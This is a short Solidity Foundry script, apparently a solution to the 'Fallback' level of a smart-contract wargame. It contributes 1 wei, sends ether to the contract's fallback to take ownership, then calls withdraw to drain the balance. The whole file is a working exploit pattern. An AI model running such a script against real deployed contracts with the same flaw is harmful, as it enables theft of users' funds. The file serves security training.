// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

interface IFallback {
    function contribute() external payable;

    function withdraw() external;
}

contract PoC is Script {
    IFallback fall =
        IFallback(payable(0x28cF211dcAff31B4c90aA321E976311f7A09f9FA)); // Replace with your Fallback instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        fall.contribute{value: 1 wei}();
        (bool success, ) = address(fall).call{value: 1 wei}("");
        require(success, "Failed to send ether");
        fall.withdraw();

        vm.stopBroadcast();
    }
}
